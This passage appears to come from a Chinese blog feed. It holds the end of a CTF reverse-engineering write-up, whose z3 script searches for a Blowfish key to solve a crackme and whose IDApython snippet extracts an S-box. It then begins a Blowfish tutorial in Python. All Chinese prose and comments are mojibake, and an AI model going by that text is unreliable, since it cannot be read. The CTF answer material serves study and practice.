class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> copy<br><span class="hljs-keyword">from</span> Blow_BOX <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># å­˜å‚¨Pç›’ä»¥åŠSç›’ï¼Œå› ä¸ºæ¯æ¬¡çˆ†ç ´ä¸€æ¬¡key Pç›’å’ŒSç›’éƒ½ä¼šå˜åŒ–ï¼Œä¸‹ä¸€æ¬¡çˆ†ç ´éœ€è¦å¤åŸ</span><br><span class="hljs-comment"># è¿™ä¸ªåœ°æ–¹éœ€è¦ä½¿ç”¨æ­¤å¤åˆ¶ å³åˆ›å»ºä¸¤ä¸ªç‹¬ç«‹çš„Pç›’ Sç›’ ä¸å¯ç®€å•ç”¨ç­‰äºå· å¦åˆ™ä¼šä¸€èµ·å˜åŒ–</span><br>P_temp = copy.deepcopy(p_box)<br>S_temp = copy.deepcopy(s_box)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_key_pbox</span>(<span class="hljs-params">_key</span>):<br>    index = <span class="hljs-number">0</span><br>    key_pbox = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>)]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            key_pbox[i] = <span class="hljs-built_in">ord</span>((_key[index])) | (key_pbox[i] &lt;&lt; <span class="hljs-number">8</span>)<br>            index += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> index &gt;= <span class="hljs-built_in">len</span>(_key):<br>                index = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>        p_box[i] ^= key_pbox[i]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Fn</span>(<span class="hljs-params">Left</span>):<br>    a = (Left &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt; <span class="hljs-number">24</span><br>    b = (Left &amp; <span class="hljs-number">0x00ff0000</span>) &gt;&gt; <span class="hljs-number">16</span><br>    c = (Left &amp; <span class="hljs-number">0x0000ff00</span>) &gt;&gt; <span class="hljs-number">8</span><br>    d = Left &amp; <span class="hljs-number">0x000000ff</span><br><br>    Sa = s_box[<span class="hljs-number">0</span>][a]<br>    Sb = s_box[<span class="hljs-number">1</span>][b]<br>    Sc = s_box[<span class="hljs-number">2</span>][c]<br>    Sd = s_box[<span class="hljs-number">3</span>][d]<br><br>    <span class="hljs-keyword">return</span> (((Sa + Sb) ^ Sc) + Sd) &amp; <span class="hljs-number">0xffffffff</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Blow_Main_Encrypt</span>(<span class="hljs-params">Left, Right</span>):<br>    <span class="hljs-comment"># print(p_box)</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        Left ^= p_box[i]<br>        Right ^= Fn(Left)<br>        Temp = Left<br>        Left = Right<br>        Right = Temp<br><br>    Temp = Left<br>    Left = Right ^ p_box[<span class="hljs-number">17</span>]<br>    Right = Temp ^ p_box[<span class="hljs-number">16</span>]<br>    <span class="hljs-keyword">return</span> Left, Right<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Blow_Main_Decrypt</span>(<span class="hljs-params">Left, Right</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        Left ^= p_box[i]<br>        Right ^= Fn(Left)<br><br>        Temp = Left<br>        Left = Right<br>        Right = Temp<br><br>    Temp = Left<br>    Left = Right ^ p_box[<span class="hljs-number">0</span>]<br>    Right = Temp ^ p_box[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> Left, Right<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Change_Box</span>():<br>    Left = <span class="hljs-number">0</span><br>    Right = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span class="hljs-number">2</span>):<br>        Left, Right = Blow_Main_Encrypt(Left, Right)<br>        p_box[i] = Left<br>        p_box[i + <span class="hljs-number">1</span>] = Right<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>, <span class="hljs-number">2</span>):<br>            Left, Right = Blow_Main_Encrypt(Left, Right)<br>            s_box[i][j] = Left<br>            s_box[i][j + <span class="hljs-number">1</span>] = Right<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">BlowFish_Encrypt</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(data) % <span class="hljs-number">8</span>:<br>        data += <span class="hljs-string">&#x27;0&#x27;</span><br>    cipher = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">8</span>):<br>        Left = (<span class="hljs-built_in">ord</span>(data[i]) &lt;&lt; <span class="hljs-number">24</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">16</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">3</span>]))<br>        Right = (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">24</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">5</span>]) &lt;&lt; <span class="hljs-number">16</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">6</span>]) &lt;&lt; <span class="hljs-number">8</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">7</span>]))<br>        Left, Right = Blow_Main_Encrypt(Left, Right)<br>        cipher += <span class="hljs-built_in">hex</span>(Left)[<span class="hljs-number">2</span>:]<br>        cipher += <span class="hljs-built_in">hex</span>(Right)[<span class="hljs-number">2</span>:]<br><br>    <span class="hljs-built_in">print</span>(cipher)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">BlowFish_Decrypt</span>(<span class="hljs-params">cipher</span>):<br>    plain = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher), <span class="hljs-number">16</span>):<br>        Left = cipher[i:i + <span class="hljs-number">8</span>]<br>        Right = cipher[i + <span class="hljs-number">8</span>:i + <span class="hljs-number">16</span>]<br>        <span class="hljs-comment"># print(Left)</span><br>        Left = <span class="hljs-built_in">int</span>(Left, base=<span class="hljs-number">16</span>)<br>        Right = <span class="hljs-built_in">int</span>(Right, base=<span class="hljs-number">16</span>)<br>        <br>        Left, Right = Blow_Main_Decrypt(Left, Right)<br>        plain += <span class="hljs-built_in">hex</span>(Left)[<span class="hljs-number">2</span>:]<br>        plain += <span class="hljs-built_in">hex</span>(Right)[<span class="hljs-number">2</span>:]<br><br>    plain = <span class="hljs-built_in">int</span>(plain, base=<span class="hljs-number">16</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Now ans: &quot;</span>, <span class="hljs-built_in">hex</span>(plain)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">return</span> plain<br><br><span class="hljs-comment"># åˆ›å»º8ä¸ª8bitsçš„ä½å‘é‡</span><br><span class="hljs-comment"># å­˜æ”¾åœ¨flagp[]åˆ—è¡¨ä¸­ï¼Œæ¯ä¸€ä¸ªä½å‘é‡ç¬¦å·æ˜¯flag[i]</span><br>flag = [BitVec(<span class="hljs-string">&quot;flag[%d]&quot;</span> % i, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)]<br>S = Solver()<br><br><span class="hljs-comment"># æ·»åŠ çº¦æŸæ¡ä»¶</span><br>S.add(flag[<span class="hljs-number">0</span>] * flag[<span class="hljs-number">1</span>] == <span class="hljs-number">13310</span>)<br>S.add(flag[<span class="hljs-number">2</span>] + flag[<span class="hljs-number">3</span>] == <span class="hljs-number">185</span>)<br>S.add(flag[<span class="hljs-number">6</span>] - flag[<span class="hljs-number">7</span>] == -<span class="hljs-number">19</span>)<br>S.add(flag[<span class="hljs-number">0</span>] + flag[<span class="hljs-number">7</span>] == <span class="hljs-number">195</span>)<br>S.add(flag[<span class="hljs-number">0</span>] * flag[<span class="hljs-number">5</span>] == <span class="hljs-number">9240</span>)<br><br><span class="hljs-comment"># è¿›ä¸€æ­¥æ·»åŠ çº¦æŸæ¡ä»¶ï¼Œç•¥å»éå¸¸è§flagå­—ç¬¦ï¼Œæ¯”å¦‚&#x27;|&#x27;  &#x27;,&#x27;  &#x27;&lt;&#x27;ç­‰</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    S.add(flag[i] &gt;= <span class="hljs-number">33</span>)<br>    S.add(flag[i] &lt;= <span class="hljs-number">125</span>)<br>    S.add(flag[i] != <span class="hljs-number">39</span>)<br>    S.add(flag[i] != <span class="hljs-number">58</span>)<br>    S.add(flag[i] != <span class="hljs-number">59</span>)<br>    S.add(flag[i] != <span class="hljs-number">60</span>)<br>    S.add(flag[i] != <span class="hljs-number">61</span>)<br>    S.add(flag[i] != <span class="hljs-number">62</span>)<br>    S.add(flag[i] != <span class="hljs-number">96</span>)<br>    S.add(flag[i] != <span class="hljs-number">124</span>)<br>    S.add(flag[i] != <span class="hljs-number">91</span>)<br>    S.add(flag[i] != <span class="hljs-number">92</span>)<br>    S.add(flag[i] != <span class="hljs-number">93</span>)<br>    S.add(flag[i] != <span class="hljs-number">94</span>)<br><span class="hljs-comment"># Cå³å¾…è§£æ•°æ® å³qword_6C10E01</span><br>C = <span class="hljs-string">&#x27;69142BA8383E7938&#x27;</span><br><span class="hljs-comment"># anså³å¾…æ¯”å¯¹æ•°æ®</span><br>ans = <span class="hljs-number">0x6f8cb46b5138c655</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    S.check()<br>    T = S.model() <span class="hljs-comment"># å¾—åˆ°ä¸€ç»„è§£</span><br>    Try = <span class="hljs-string">&#x27;&#x27;</span><br>    condition = [] <span class="hljs-comment"># ç”¨äºæŠŠè¿™ä¸€ç»„è§£æ·»åŠ è¿›çº¦æŸå˜é‡ï¼Œç”¨äºæ’é™¤æ­¤ç»„è§£</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        a = T.<span class="hljs-built_in">eval</span>(flag[i]).as_long() <span class="hljs-comment"># æŠŠflag[i]ä»z3çš„ç±»å‹è½¬ä¸ºpythonçš„Intç±»å‹</span><br>        condition.append(flag[i] != a)<span class="hljs-comment"># æ·»åŠ çº¦æŸæ¡ä»¶ï¼ŒæŠŠè¿™ä¸€æ•´ç»„è§£éƒ½ä½œä¸ºçº¦æŸæ¡ä»¶</span><br><br>        Try += <span class="hljs-built_in">chr</span>(a) <span class="hljs-comment"># å½“å‰è§£</span><br>    S.add(Or(condition))<span class="hljs-comment"># æŠŠå½“å‰è¿™ç»„è§£æ·»åŠ è¿›å»ï¼Œè¿™æ ·ä»¥åçš„è§£å°±ä¸ä¼šå†æœ‰æ­¤ç»„è§£äº†</span><br>    <span class="hljs-comment"># note: æ³¨æ„ä¸å¯ä»¥ç®€å•ä½¿ç”¨S.add(flag[i]!=xxx)ï¼Œå› ä¸ºè¿™æ ·æ’é™¤å…¶ä»–è§£ï¼Œå³åœ¨flag[i]==xxçš„å‰æä¸‹ï¼Œä¹Ÿæœ‰å¾ˆå¤šè§£</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Trying:&quot;</span>, Try, end=<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-comment"># ä½¿ç”¨åˆšåˆšå¾—åˆ°çš„å€¼å»å°è¯•è§£å¯†</span><br>    init_key_pbox(Try)<br>    Change_Box()<br>    an = BlowFish_Decrypt(C)<br><br>    <span class="hljs-keyword">if</span> an == ans:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] answer:&quot;</span>, Try)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment"># æ¢å¤Pç›’ Sç›’ </span><br>    p_box = copy.deepcopy(P_temp)<br>    s_box = copy.deepcopy(S_temp)<br><br></code></pre></td></tr></table></figure><p>å…³äºSç›’çš„æå–å¯ä»¥è¯´é“è¯´é“ï¼Œç”±äºBlowFishçš„Sç›’æ˜¯4*256çš„äºŒç»´æ•°ç»„ï¼Œå°±æ˜¯æœ‰1024ä¸ªå€¼ï¼Œé‚£ä¹ˆåœ¨IDAå°±ä½“ç°ä¸ºè¿™ä¸ªå½¢å¼</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202305302222010.png" alt="3.png"></p><p>ä»¥å¾€æˆ‘éƒ½æ˜¯ä¸€è¡Œè¡Œå¤åˆ¶ï¼Œä½†æ— ç–‘è¿™æ ·çš„æ•ˆç‡æ˜¯æä½çš„ï¼Œè€Œä¸”ä¹Ÿå¾ˆç¹çã€‚å› ä¸ºæˆ‘çš„BlowFishè„šæœ¬ä¸­Sç›’æ˜¯ä»¥4*256äºŒç»´æ•°ç»„å½¢å¼å­˜å‚¨çš„ï¼Œéš¾ä¸æˆæˆ‘è¿˜è¦æ¯æ¬¡æ•°256ä¸ªæ¥å¤åˆ¶ï¼Œç„¶åå¤åˆ¶4æ¬¡ï¼Ÿ</p><p>æ˜¾ç„¶æ˜¯ä¸ç§‘å­¦çš„ï¼Œæ‰€ä»¥å¯ä»¥å€ŸåŠ©äºIDApythonæ¥å¸®æˆ‘ä»¬æå–è¿™ä¸ªSç›’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">ea = <span class="hljs-number">0x6c00e0</span><br>S_Box=[[],[],[],[]]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1024</span>):<br>    S_Box[i//<span class="hljs-number">256</span>].append((idc.get_wide_dword(ea)))<br>    ea += <span class="hljs-number">4</span><br><span class="hljs-built_in">print</span>(S_Box)<br></code></pre></td></tr></table></figure><p>çœ‹ï¼Œç®€ç®€å•å•å‡ è¡Œä»£ç å°±å¯ä»¥å¸®æˆ‘ä»¬æŠŠè¿™ä¸ª4*256çš„æ•°ç»„æŒ‰ç…§æˆ‘ä»¬æ‰€æƒ³çš„æ–¹å¼å­˜æ”¾ï¼Œå¤šè½»æ¾ï¼ˆè¿™å°±æ˜¯æŠ€å¤šä¸å‹èº«å§hhh</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è¿™é¢˜æ€è·¯å¾ˆç®€å•ï¼Œå°±æ˜¯çˆ†ç ´ã€‚ä½†è¿™é¢˜æœ€å¤§çš„æ”¶è·åœ¨äºå­¦ä¹ äº†<strong>BlowFishåŠ å¯†ç®—æ³•</strong>ï¼Œè€Œä¸”æœ€é‡è¦çš„æ˜¯å­¦ä¼šäº†<strong>å¦‚ä½•éå†z3çš„æ‰€æœ‰è§£</strong>ï¼Œ<strong>å¦‚ä½•æŠŠz3ç±»å‹è½¬ä¸ºpythonç±»å‹</strong>ï¼Œä»¥ä¾¿è¿›ä¸€æ­¥çˆ†ç ´æ±‚è§£ã€‚å› ä¸ºz3ç±»å‹æ˜¯ä¸å¯ä»¥ä½œä¸ºæ•°ç»„ç´¢å¼•çš„ï¼Œåªæœ‰pythonçš„Intå‹æ‰å¯ä»¥ã€‚</p><p>angrè§£æ­¤é¢˜ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿæ˜¯ç¬¦å·æ‰§è¡ŒæŠŠå¯†é’¥ç©ºé—´ç¼©å°ï¼Œç„¶åå†ä¸€ä¸ªä¸€ä¸ªçˆ†ç ´å¯†é’¥ï¼Œä¸ä¸Šé¢çš„æ€è·¯å®Œå…¨ä¸€æ ·</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>recurrence</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>reverse</tag>
      
      <tag>idapython</tag>
      
      <tag>z3</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BlowFish åŠ å¯†ç®—æ³• pythonå®ç°</title>
    <link href="/2023/05/29/BlowFish/"/>
    <url>/2023/05/29/BlowFish/</url>
    
    <content type="html"><![CDATA[<p>BlowFishç®—æ³•å¤ç°</p><span id="more"></span><p>æœ€è¿‘åœ¨åšé€†å‘çš„æ—¶å€™ï¼Œé‡åˆ°äº†ä¸€ä¸ªæ–°çš„åŠ å¯†ç®—æ³•ï¼Œè€Œä¸”å®ç°ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå°±æ­¤è®°å½•ä¸€ä¸‹ã€‚</p><p>å…ˆç®€å•ä»‹ç»ä¸‹BlowFishç®—æ³•ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯¹ç§°å¯†é’¥åˆ†ç»„åŠ å¯†ç®—æ³•ï¼Œè€Œä¸”é‡‡ç”¨feistelçš„åŠ å¯†æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯æ¯æ¬¡åŠ å¯†64bitsæ•°æ®ï¼Œå…ˆåˆ†æˆå·¦å³å„32bitsä¸¤éƒ¨åˆ†ï¼Œç„¶åç»è¿‡å¼‚æˆ–åŠ å¯†ï¼ŒFè½®å‡½æ•°ç­‰å¾—åˆ°å¯†æ–‡ï¼Œæ„Ÿè§‰å°±åƒæ˜¯AESçš„miniç‰ˆã€‚</p><p>BlowFishåŠ å¯†ä¼šä½¿ç”¨åˆ°ä¸¤ä¸ªç›’ï¼ŒPç›’ä»¥åŠSç›’ã€‚å…¶ä¸­Pç›’æ˜¯18ä¸ª32ä½çš„æ•°å­—ï¼Œé€šå¸¸ä½¿ç”¨Î çš„å°æ•°éƒ¨åˆ†ç»„æˆï¼Œä¾‹å¦‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">p</span>[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>x243F6A88<br><span class="hljs-attribute">P</span>[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>X85A308D3<br><span class="hljs-attribute">P</span>[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>X13198A2E<br><span class="hljs-attribute">P</span>[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>X03707344<br></code></pre></td></tr></table></figure><p>å…¶ä¸­0.1415926535çš„åå…­è¿›åˆ¶å°±æ˜¯0.243F6A88</p><p>Sç›’ä¹Ÿæ˜¯ç”±Î çš„å°æ•°éƒ¨åˆ†ç»„æˆï¼Œä½†Sç›’æ˜¯4*256çš„äºŒç»´æ•°ç»„ã€‚</p><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä¸ç®¡æ˜¯åœ¨DESè¿˜æ˜¯AESä¸­ï¼Œå„ç§ç›’é€šå¸¸éƒ½æ˜¯ä¸å˜çš„ï¼Œä½†æ˜¯åœ¨BlowFishä¸­ï¼Œè¿™ä¸¤ä¸ªç›’éƒ½ä¼šéšç€æˆ‘ä»¬çš„è¾“å…¥çš„å¯†é’¥è€Œäº§ç”Ÿå˜åŒ–ï¼Œè€Œä¸”è¿™ä¸ªå˜åŒ–ä¹Ÿæ˜¯ç”¨BlowFishç®—æ³•æ¥å®ç°ï¼Œæˆ‘ä»¬åˆšåˆšæåˆ°BlowFishæ ¸å¿ƒåŠ å¯†å°±æ˜¯åˆ†æˆå·¦å³ä¸¤éƒ¨åˆ†ï¼Œç„¶åå¼‚æˆ–ã€è½®å‡½æ•°ç­‰ï¼Œç„¶è€Œè¿™ä¹Ÿæ˜¯Pç›’å’ŒSç›’çš„å˜åŒ–ç®—æ³•ã€‚</p><p>æ•´ä½“åŠ å¯†æµç¨‹ï¼š <strong>è¾“å…¥32~448bitså¯†é’¥ï¼Œå…ˆåˆ©ç”¨å¯†é’¥å¯¹Pç›’ ä»¥åŠ Sç›’åŠ å¯†ï¼Œä½¿ç”¨åŠ å¯†åçš„Pç›’ Sç›’åŠ å¯†æ˜æ–‡</strong></p><p>å…·ä½“çš„ï¼Œé¦–å…ˆPç›’å’Œè¾“å…¥çš„å¯†é’¥è½®å›çš„å¼‚æˆ–ï¼Œç„¶åä½¿ç”¨64ä½çš„æ•°æ®0å»èµ°ä¸€éBlowFishï¼Œå°†å¾—åˆ°çš„å€¼é‡æ–°èµ‹ç»™Pç›’ï¼Œå»¶ç”¨åˆšåˆšå¾—åˆ°çš„å€¼ï¼Œç±»ä¼¼åœ°å»æ”¹å˜Sç›’çš„å€¼ã€‚</p><p>çœ‹ä¸€ä¸‹ä»£ç å°±æ˜ç¡®äº†</p><p>é¦–å…ˆæˆ‘ä»¬è¾“å…¥å¯†é’¥ï¼Œè½®å›åœ°å°†å¯†é’¥æ”¾è¿›key_pboxé‡Œé¢ï¼Œkey_pboxåªæ˜¯ä¸€ä¸ªä¸­é—´å€¼ï¼Œç”¨äºå­˜æ”¾32ä½çš„å¯†é’¥</p><p>æ¯”å¦‚æˆ‘ä»¬è¾“å…¥å¯†é’¥<code>abcdef</code>,é‚£ä¹ˆ</p><p>Â·key_pbox[0] &#x3D; 0x61626364</p><p>Â·key_pbox[1] &#x3D; 0x65666162 </p><p>Â·key_pbox[2] &#x3D; 0x63646566â€¦â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_key_pbox</span>(<span class="hljs-params">_key</span>):<br>    index = <span class="hljs-number">0</span><br>    <span class="hljs-comment">#åˆ©ç”¨index å®ç°è½®å›å–å¯†é’¥æ“ä½œ</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            <span class="hljs-comment">#è¿™é‡Œå®ç°å°†é€ä¸ªå¯†é’¥å­—ç¬¦ æ‹¼æ¥ä½32ä½çš„å¯†é’¥</span><br>            key_pbox[i] = <span class="hljs-built_in">ord</span>(_key[index]) | (key_pbox[i] &lt;&lt; <span class="hljs-number">8</span>)<br>            index += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> index &gt;= <span class="hljs-built_in">len</span>(_key):<br>                index = <span class="hljs-number">0</span><br>   <span class="hljs-comment"># Pç›’å’Œå¯†é’¥å¼‚æˆ–</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>        p_box[i] ^= key_pbox[i]<br><br></code></pre></td></tr></table></figure><p>åœ¨Pç›’å’Œå¯†é’¥å¼‚æˆ–å®Œåï¼Œå°±ä½¿ç”¨BlowFishåŠ å¯†æµç¨‹ï¼Œå†æ¬¡æ”¹å˜Pç›’ï¼Œå˜åŒ–Sç›’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">Change_Box</span>():<br>    Left = <span class="hljs-number">0</span><br>    Right = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span class="hljs-number">2</span>):<br>        <span class="hljs-comment"># è¿™é‡Œçš„ Blow_Mian_Eccrypt å°±æ˜¯BlowFishçš„åŠ å¯†ç®—æ³•ï¼Œå³å·¦å³ç»è¿‡å¼‚æˆ–ã€Fè½®å‡½æ•°ã€æ¢ä½ç­‰</span><br>        <span class="hljs-comment"># è¿™é‡Œä»¤Left = Right =0 æ¥å¯¹Pç›’ å’ŒSç›’å˜åŒ–</span><br>        Left, Right = Blow_Main_Encrypt(Left, Right)<br>        p_box[i] = Left<br>        p_box[i + <span class="hljs-number">1</span>] = Right<br>        <br>  <span class="hljs-comment"># å˜åŒ–å®Œåï¼ŒLeft å’Œ Right å¹¶ä¸æ¸…é›¶ è€Œæ˜¯ç»§ç»­ä½¿ç”¨</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>, <span class="hljs-number">2</span>):<br>            Left, Right = Blow_Main_Encrypt(Left, Right)<br>            s_box[i][j] = Left<br>            s_box[i][j + <span class="hljs-number">1</span>] = Right<br><br></code></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œå°±å¾—æ­£å¼ä»‹ç»ä¸‹BlowFishçš„åŠ å¯†å‡½æ•°</p><p>å…ˆç»™å‡ºæµç¨‹å›¾</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202305291921714.png" alt="20200726213533691"></p><p>è¿™é‡Œçš„P1å°±æ˜¯p_box[0],P2å°±æ˜¯p_box[1]ï¼Œèµ°ä¸€éè¿™ä¸ªæµç¨‹ï¼Œåˆ©ç”¨å¾—åˆ°å€¼æ›´æ–°ç›¸åº”çš„p_boxã€‚è¿™é‡Œé¢åˆæ¶‰åŠåˆ°ä¸€ä¸ªFå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°èµ·å§‹å°±æ˜¯ä¸€ä¸ªæ›¿ä»£åŠŸèƒ½ï¼Œå®ƒçš„è¾“å…¥æ˜¯ä¸€ä¸ª32bitsçš„æ•°ï¼Œå°±å¯¹è¿™ä¸ª32bitsçš„æ•°åšä¸€äº›æ“ä½œï¼Œä¸¢å»Sç›’é‡Œé¢æ‰¾ï¼Œç„¶åæ›¿æ¢ã€‚ç¨å¾®ä¼šçœ‹åˆ°å…·ä½“è§„åˆ™</p><p>ä»£ç å®ç°ï¼š</p><p>ä»£ç ä¹Ÿå¾ˆç®€æ´ï¼Œçœ‹çœ‹å°±æ˜ç™½äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 